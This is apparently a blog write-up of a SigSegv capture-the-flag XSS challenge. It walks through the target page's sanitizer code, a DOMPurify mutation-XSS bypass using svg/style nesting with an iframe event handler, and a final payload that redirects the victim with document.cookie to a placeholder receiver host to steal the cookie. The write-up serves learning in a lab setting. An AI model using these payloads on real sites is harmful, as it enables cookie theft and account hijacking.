This year SigSegv qualifiers are back 

# XSS challenge: History of Browser Evolution

You are tasked to steal the cookie from a web page. The target machine is running "Chrome with recent updates", so it is advisable to test it in chrome.


You have one URL to test your payloads and the other one to validate your flag. The validation page will pass the link to a bot which will trigger XSS.
```
http://qual-challs.rtfm.re:8080/
http://qual-challs.rtfm.re:8080/check
```
![Image](https://eqqn.github.io/images/hobe.jpg)
### Finding injection point
Since there is no obvious forms or input elements apparent, we look at the page source ( follow comments for my thought proccess ) :

```js
    var nuclearSanitizer = function (dirty) {
        var clean = dirty;
     //## These are directives banned by Developer
        forbiddenWords = ["onerror", "onload", "onunload", "img", "focus"];    
        
        for (const fw of forbiddenWords) {
            if (dirty.toLowerCase().includes(fw)) {
                console.log(fw);
                clean = "";
                break;
            }
        }
        return clean;
    }
    
    var getUrlParam = function (name) {
        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
        var r = unescape(window.location.search.substr(1)).match(reg);
        if (r != null) return r[2];
        return null;
    }

    var layout = getUrlParam("layout");      //## This is where the URL parameter is taken
    var clean = DOMPurify.sanitize(layout);
    
    // Hehe I made a custom sanitizer, no worriez
    clean = nuclearSanitizer(clean);

    var injectionPoint = document.getElementById("injection");
    injectionPoint.innerHTML = clean;
    injectionPoint.innerHTML = injectionPoint.innerHTML;
```

The *getUrlParam* function takes url parameter *layout* and puts it inside "injection" element of the webpage. 
Queries such as ` http://qual-challs.rtfm.re:8080/?layout=YOURSTRINGHERE ` will render on the page.

![Image](https://eqqn.github.io/images/hobe2.jpg)

However there is pesky **DOMPurify.sanitize(layout);** getting in our way of triggering the desired alert(1) box.
After giving automated tools a try ( XSStrike and Burpsuite) and trying to concatenate some form of `<script>alert(222)</script> `to render on the page I kept getting owned by the sanitizer. 

Alternatives from XSS cheat sheets[1][2]( that apply to chrome) didn't seem to work. However my friend point me to an interesting resource - DOMPurify bypass.

### Bypassing DOMPurify

There is an excellent write-up describing a recent vulnerability in DOMPurify, that uses browsers auto-fix feature to close the tags of HTML elements that are not properly matching.

More on this behaviour here : https://research.securitum.com/dompurify-bypass-using-mxss/

So the PoC payload referenced in the article looks like this : 

` <svg></p><style><a id="</style><img src=1 onerror=alert(1)>"> `
However it uses both **img** and **onerror** tags stripped by *NuclearSanitizer()*, so we can look once again at the cheat sheets and find other components that could do the trick. 

![Image](https://eqqn.github.io/images/hobe3.jpg)

`?layout=<svg></p><style><a id="</style><iframe src=1 onmouseover=alert(333)>"> `
With this I popped the first alert. DOMPurify is bypassed. Great, now to make it run without interaction and onto exfiltration. In this part you can get creative.

To steal the cookie, you need to make a request and transfer it to a domain you control. A convenient web service for that is "Requestbin", which allows you to make receive requests on their servers.

`?layout=<svg></p><style><a id="</style><iframe src=javascript:document.location='hxxps://REPLACE-WITH-YOUR-RECEIVER/'+ document.cookie>">`

Once we submit the full URL into the validator, a HTTP request is made to our cookie receiver server :

![Image](https://eqqn.github.io/images/hobe4.jpg)

`flag=sigsegv{pur1fy_mY_s0ul}`

This was a fun challenge, and I got to learn XSS the fun way. 


[1] Web Security Academy XSS cheat sheet https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 

[2] Payload ALL the things XSS repo https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection


